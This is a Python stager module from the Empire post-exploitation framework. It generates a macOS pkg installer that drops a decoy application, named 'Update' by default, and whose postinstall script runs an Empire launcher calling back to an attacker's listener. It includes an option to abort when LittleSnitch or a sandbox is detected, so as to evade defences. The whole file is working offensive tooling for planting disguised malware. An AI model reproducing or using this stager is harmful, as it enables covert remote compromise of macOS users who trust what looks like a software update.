from __future__ import print_function
from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'pkg',

            'Author': ['@xorrior'],

            'Description':
                'Generates a pkg installer. The installer will copy a custom (empty) application to the /Applications '
                'folder. The postinstall script will execute an Empire launcher.',

            'Comments': ['']
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'python',
                'SuggestedValues': ['python'],
                'Strict': True
            },
            'AppIcon': {
                'Description': 'Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none.',
                'Required': False,
                'Value': ''
            },
            'AppName': {
                'Description': 'Name of the Application Bundle. This change will reflect in the Info.plist and the name of the binary in Contents/MacOS/.',
                'Required': False,
                'Value': ''
            },
            'OutFile': {
                'Description': 'File to write dmg volume to.',
                'Required': True,
                'Value': '/tmp/out.pkg'
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        user_agent = self.options['UserAgent']['Value']
        safe_checks = self.options['SafeChecks']['Value']
        icns_path = self.options['AppIcon']['Value']
        app_name = self.options['AppName']['Value']
        arch = 'x64'

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language,
                                                           userAgent=user_agent,
                                                           safeChecks=safe_checks)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        else:
            if app_name == '':
                app_name = "Update"
            disarm = True
            launcher_code = launcher.strip('echo').strip(' | python3 &').strip("\"")
            application_zip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher_code, Arch=arch,
                                                                       icon=icns_path, AppName=app_name, disarm=disarm)
            pkginstaller = self.mainMenu.stagers.generate_pkg(launcher=launcher, bundleZip=application_zip,
                                                              AppName=app_name)
            return pkginstaller
